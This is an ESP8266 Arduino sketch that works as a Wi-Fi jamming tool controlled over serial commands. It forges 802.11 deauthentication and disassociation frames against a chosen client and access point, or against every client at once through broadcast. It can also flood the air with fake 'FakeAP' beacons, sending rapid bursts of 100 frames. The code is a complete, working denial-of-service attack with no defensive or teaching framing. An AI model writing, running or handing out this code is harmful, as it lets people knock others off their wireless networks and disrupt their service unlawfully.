#include <Arduino.h>

extern "C" {
  #include "user_interface.h"
}


uint8_t targetMac[6] = {  };
uint8_t bssid[6] = { };
uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

String attack_mode = "";
bool attacking = false;
unsigned long lastSend = 0;
const unsigned long attackInterval = 50;
int beaconCounter = 0;
const uint8_t fixedChannel = 8;

void sendPacket(uint8_t subtype, uint8_t *target, uint8_t *source) {
  uint8_t packet[26] = {
    subtype, 0x00,
    0x3A, 0x01,
    target[0], target[1], target[2], target[3], target[4], target[5],
    source[0], source[1], source[2], source[3], source[4], source[5],
    source[0], source[1], source[2], source[3], source[4], source[5],
    0x00, 0x00,
    0x07, 0x00
  };
  wifi_send_pkt_freedom(packet, sizeof(packet), 0);

  Serial.print("  → Packet sent | subtype: 0x");
  Serial.print(subtype, HEX);
  Serial.print(" | to: ");
  for (int i = 0; i < 6; i++) {
    if (target[i] < 16) Serial.print("0");
    Serial.print(target[i], HEX);
    if (i < 5) Serial.print(":");
  }
  Serial.println();
}

void sendBeacon(const char* ssid, uint8_t ch) {
  uint8_t beaconPacket[128] = {
    0x80, 0x00,
    0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED,
    0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED,
    0x00, 0x00,
    0x00, 0x00,
    0x00, 0x00,
    0x64, 0x00,
    0x01, 0x04,
    0x00, (uint8_t)strlen(ssid)
  };

  memcpy(&beaconPacket[38], ssid, strlen(ssid));
  uint8_t ssidEnd = 38 + strlen(ssid);

  beaconPacket[ssidEnd++] = 0x01;
  beaconPacket[ssidEnd++] = 0x08;
  uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
  memcpy(&beaconPacket[ssidEnd], rates, 8);
  ssidEnd += 8;

  beaconPacket[ssidEnd++] = 0x03;
  beaconPacket[ssidEnd++] = 0x01;
  beaconPacket[ssidEnd++] = ch;

  wifi_send_pkt_freedom(beaconPacket, ssidEnd, 0);

  Serial.print("  → Beacon sent with SSID: ");
  Serial.print(ssid);
  Serial.print(" on channel ");
  Serial.println(ch);
}

void performAttack() {
  Serial.print("⚔️  Running attack mode: ");
  Serial.println(attack_mode);

  for (int i = 0; i < 100; i++) {
    if (attack_mode == "deauth") {
      sendPacket(0xC0, targetMac, bssid);
      sendPacket(0xC0, bssid, targetMac);
    } else if (attack_mode == "disassoc") {
      sendPacket(0xA0, targetMac, bssid);
      sendPacket(0xA0, bssid, targetMac);
    } else if (attack_mode == "broadcast") {
      sendPacket(0xC0, broadcast, bssid);
    } else if (attack_mode == "beacon") {
      char fakeSSID[32];
      snprintf(fakeSSID, sizeof(fakeSSID), "FakeAP_%03d", beaconCounter++);
      sendBeacon(fakeSSID, fixedChannel);
    }
  }
  Serial.println("burst completed [" + attack_mode + "]\n");
}

void setup() {
  Serial.begin(115200);
  Serial.println("ESP8266 ready. Commands: start, stop, deauth, disassoc, broadcast, beacon");

  wifi_set_opmode(STATION_MODE);
  delay(100);
  wifi_promiscuous_enable(0);
  delay(100);
  wifi_set_channel(fixedChannel);
  wifi_promiscuous_enable(1);
}

void loop() {
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();

    if (cmd == "start") {
      if (attack_mode != "") {
        attacking = true;
        Serial.println("attack started in mode: " + attack_mode);
      } else {
        Serial.println("please select a mode first: deauth, disassoc, broadcast, beacon");
      }
    } else if (cmd == "stop") {
      attacking = false;
      Serial.println("attack stopped");
    } else if (cmd == "deauth" || cmd == "disassoc" || cmd == "broadcast" || cmd == "beacon") {
      attack_mode = cmd;
      Serial.println("attack mode selected: " + attack_mode);
    } else {
      Serial.println("unknown command. Use: start, stop, deauth, disassoc, broadcast, beacon");
    }
  }

  if (attacking && millis() - lastSend > attackInterval) {
    performAttack();
    lastSend = millis();
  }
}
